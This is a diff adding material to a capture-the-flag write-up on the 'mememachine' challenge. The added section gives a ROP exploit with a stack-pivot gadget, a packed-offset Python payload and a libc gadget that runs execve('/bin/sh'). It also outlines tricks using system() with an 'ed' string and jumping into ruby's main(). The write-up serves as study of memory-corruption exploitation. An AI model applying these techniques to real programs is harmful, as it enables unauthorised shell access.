@@ -527,15 +527,60 @@ Rather than overwriting offset 0x8 in the meme with system(), you can overwrite 
 
     <crowell> the ruby binary doesn't have any good gadgets in it
 
+### basatan's approach: ROP to swap eax and the stack pointer
+
+    <basatan> numinit: you're missing my solution, which was use xchg eax, esp; ret; from libc
+              to put esp onto your skeletal object, then return to a libc address which setup
+              the args to execve /bin/sh and called it
+
+Another handy ROP gadget, since we control the memory eax points to:
+
+```asm
+xchg eax, esp
+ret
+```
+
+The payload then looks like:
+
+```python
+payload = ""
+payload += pack("Q",libcBase+0x4652C);
+payload += pack("Q",libcBase+0x1f4c3);
+payload += pack("Q",0x4141414141414141);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+payload += pack("Q",0);
+```
+
+Get mememachine to call `libcBase+0x1f4c3`, which swaps eax and esp. Now, eax points to memory containing `libcBase+0x4652C`, which points to the following gadget in libc that calls execve("/bin/sh"):
+
+```asm
+ mov     rax, cs:environ_ptr_0
+ lea     rdi, aBinSh     ; "/bin/sh"
+ lea     rsi, [rsp+188h+var_158]
+ mov     cs:dword_3C06C0, 0
+ mov     cs:dword_3C06D0, 0
+ mov     rdx, [rax]
+ call    execve
+```
+
 ### eboda's approach: `ed` string in ruby binary
 
     <eboda> numinit: "ed" string in binary is the easiest i would say :P
 
-The ruby binary is mapped into 32-bit address space, and apparently the string `ed` is in there. Just point to it and profit. This is a cool approach: since many UNIX tools have only 2-character filenames, you're likely to find them in many binaries.
+The ruby binary is mapped into 32-bit address space, and apparently the string `ed` is in there. Use `system` as your function pointer, the "ed" string in the ruby binary as the argument, and profit. This is a cool approach: since many UNIX tools have only 2-character filenames, you're likely to find them in many binaries.
 
 ### wait_what and G33KatWork's approach: jump to ruby's main()
 
-    <wait_what> numinit: like I said earlier, you can do it without any leaks by jumping into the ruby interpreter's main to get a repl
+    <wait_what>  numinit: like I said earlier, you can do it without any leaks by jumping into
+                 the ruby interpreter's main to get a repl
     <G33KatWork> we just jumped into main() of the ruby executable in memeshop
 
 `ruby` is mapped into space that fits into 32 bits, and this works without even setting up arguments correctly.
